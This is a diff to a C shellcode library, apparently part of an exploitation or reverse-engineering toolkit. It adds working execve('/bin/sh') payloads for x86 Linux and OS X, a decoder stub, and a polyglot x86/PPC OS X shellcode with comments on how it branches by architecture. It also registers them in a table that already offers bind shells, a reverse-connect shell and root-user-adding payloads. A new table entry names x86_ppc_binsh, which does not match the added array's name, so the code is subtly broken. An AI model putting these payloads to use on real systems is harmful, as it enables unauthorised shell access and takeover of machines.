@@ -25,8 +25,13 @@
 // moar at:
 // http://www.groar.org/expl/openbsd/english.shtml
 
+unsigned char nopcode_carver[] ="\x61\x66\x3D\x90\x90\x75\xF9\x54\xc3";
+
 unsigned char x86_linux_binsh[] =
    "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+unsigned char x86_linux_binsh1[] = // -( nemo )-
+    "\xeb\x10\x5b\x31\xc0\x50\x53\xb0\x0b\x88\x63\x07\x89\xe1\x31\xd2\xcd\x80\xe8\xeb\xff\xff\xff/bin/shX";
 
 unsigned char x86_linux_binsh2[] =
    "\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58\x99\x52"
@@ -73,7 +78,7 @@ unsigned char x86_bsd_bind4444[] =
    "\x2f\x2f\x62\x69\x89\xe3\x52\xe8\x07\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73"
    "\x68\x00\x57\x53\x89\xe1\x52\x51\x53\x50\xcd\x80";
 
-unsigned char ppc_osx_binsh0[] =
+unsigned char ppc_osx_binsh[] =
    "\x38\xa0\x00\x02\x38\x00\x00\x5a\x7f\xc3\xf3\x78\x7c\xa4\x2b\x78"
    "\x44\x00\x00\x02\x7c\x00\x02\x78\x38\xa5\xff\xff\x2c\x05\xff\xff"
    "\x40\x82\xff\xe5\x38\x00\x00\x7e\x38\x60\x00\x00\x38\x80\x00\x00"
@@ -232,6 +237,13 @@ unsigned char x86_netbsd_binsh[] =
    "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
    "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";
 
+unsigned char x86_osx_binsh[] = 
+	"\x31\xdb\x6a\x3b\x58\x53\xeb\x18\x5f"
+	"\x57\x53\x54\x54\x57\x6a\xff\x88\x5f"
+	"\x07\x89\x5f\xf5\x88\x5f\xfa\x9a\xff"
+	"\xff\xff\xff\x2b\xff\xe8\xe3\xff\xff"
+	"\xff/bin/shX";
+
 unsigned char x86_osx_bind4444[] =
    "\x33\xc9\x83\xe9\xea\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc5"
    "\x7e\x85\xb4\x83\xeb\xfc\xe2\xf4\xaf\x3c\xdd\x79\x45\x14\xe4\xec"
@@ -314,7 +326,7 @@ unsigned char x86_solaris_binshu[] =
 "\x0f\x42\x49\x4e\x0f\x53\x48"            /* /bin/sh -= 0x20          */
 "\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";
 
-unsigned char ppc_osx_binsh[] = 
+unsigned char ppc_osx_binsh0[] = 
 "\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7d\x68\x02\xa6\x3b\xeb\x01\x71\x39\x40\x01\x71"
 "\x39\x1f\xfe\xce\x7c\xa8\x29\xae\x38\x7f\xfe\xc7\x90\x61\xff\xf8\x90\xa1\xff\xfc"
 "\x38\x81\xff\xf8\x38\x0a\xfe\xca\x44\xff\xff\x02\x60\x60\x60\x60\x38\x0a\xfe\x90"
@@ -451,6 +463,42 @@ char dual_linux[] =
 "\x73\x68\x68\x2f\x62\x69\x6e\x54"
 "\x5b\x52\x53\x54\x59\x0f\x34";
 
+char x86_ppc_osx_binsh[] = 
+//
+// These four bytes work out to the following instruction 
+// in ppc arch: "rlwnm   r16,r28,r29,13,4", which will
+// basically do nothing on osx/ppc.
+// 
+// However on x86 architecture the four bytes are 3 
+// instructions:
+// 
+// "push/nop/jmp"
+//
+// In this way, execution will be taken to the x86 shellcode
+// on an x86 machine, and the ppc shellcode when running
+// on a ppc architecture machine.
+//
+"\x5f\x90\xeb\x48"
+
+// ppc execve() code by b-r00t
+"\x7c\xa5\x2a\x79\x40\x82\xff\xfd"
+"\x7d\x68\x02\xa6\x3b\xeb\x01\x70"
+"\x39\x40\x01\x70\x39\x1f\xfe\xcf"
+"\x7c\xa8\x29\xae\x38\x7f\xfe\xc8"
+"\x90\x61\xff\xf8\x90\xa1\xff\xfc"
+"\x38\x81\xff\xf8\x38\x0a\xfe\xcb"
+"\x44\xff\xff\x02\x7c\xa3\x2b\x78"
+"\x38\x0a\xfe\x91\x44\xff\xff\x02"
+"\x2f\x62\x69\x6e\x2f\x73\x68\x58"
+
+// osx86 execve() code by nemo
+"\x31\xdb\x6a\x3b\x58\x53\xeb\x18\x5f"
+"\x57\x53\x54\x54\x57\x6a\xff\x88\x5f"
+"\x07\x89\x5f\xf5\x88\x5f\xfa\x9a\xff"
+"\xff\xff\xff\x2b\xff\xe8\xe3\xff\xff"
+"\xff/bin/shX";
+
+
 
 #define ENTRY(a,b,c,x,y,z) { .name=x, .desc=z, .data=(unsigned char *)&y, .len=sizeof(y), \
 	.cmd=a, .host=b, .port=c },
@@ -461,6 +509,7 @@ struct shellcode_t shellcodes[] = {
  ENTRY(0,0,0,"arm.linux.suidsh",      arm_linux_suidsh,         "Setuid and runs /bin/sh" )
  ENTRY(0,0,0,"arm.linux.bind",        arm_linux_bind,           "Binds /bin/sh to a tcp port" )
  ENTRY(0,0,30,"armle.osx.reverse",    armle_osx_reverse,        "iPhone reverse connect shell to HOST and PORT" )
+ ENTRY(0,0,0,"dual.osx.binsh",        x86_ppc_binsh,            "x86/ppc MacOSX /bin/sh shellcode" )
  ENTRY(0,0,0,"mips.linux.binsh",      mips_linux_binsh,         "Runs /bin/sh (tested on loongson2f)." )
  ENTRY(0,0,0,"ppc.osx.adduser",       ppc_osx_adduser,          "Adds a root user named 'r00t' with no pass." )
  ENTRY(0,0,0,"ppc.osx.binsh",         ppc_osx_binsh,            "Executes /bin/sh" )
@@ -480,12 +529,14 @@ struct shellcode_t shellcodes[] = {
  ENTRY(0,0,0,"x86.linux.adduser",     x86_linux_adduser,        "Adds user 'x' with password 'y'" )
  ENTRY(0,0,0,"x86.linux.bind4444",    x86_linux_bind4444,       "Binds a shell at TCP port 4444" )
  ENTRY(0,0,0,"x86.linux.binsh",       x86_linux_binsh,          "Executes /bin/sh" )
+ ENTRY(0,0,0,"x86.linux.binsh1",      x86_linux_binsh1,          "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.linux.binsh2",      x86_linux_binsh2,         "Executes /bin/sh" )
- ENTRY(43,0,0,"x86.linux.binsh3",      x86_linux_binsh3,         "Executes /bin/sh or CMD" )
+ ENTRY(43,0,0,"x86.linux.binsh3",     x86_linux_binsh3,         "Executes /bin/sh or CMD" )
  ENTRY(0,0,0,"x86.linux.udp4444",     x86_linux_udp4444,        "Binds a shell at UDP port 4444" )
  ENTRY(0,0,0,"x86.netbsd.binsh",      x86_netbsd_binsh,         "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.openbsd.binsh",     x86_openbsd_binsh,        "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.openbsd.bind6969",  x86_openbsd_bind6969,     "Executes /bin/sh" )
+ ENTRY(0,0,0,"x86.osx.binsh",         x86_osx_binsh,            "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.osx.bind4444",      x86_osx_bind4444,         "Binds a shell at port 4444" )
  ENTRY(0,0,0,"x86.solaris.binshu",    x86_solaris_binshu,       "Runs /bin/sh (toupper() safe)" )
  ENTRY(0,0,0,"x86.solaris.bind4444",  x86_solaris_bind4444,     "Binds a shell at port 4444" )
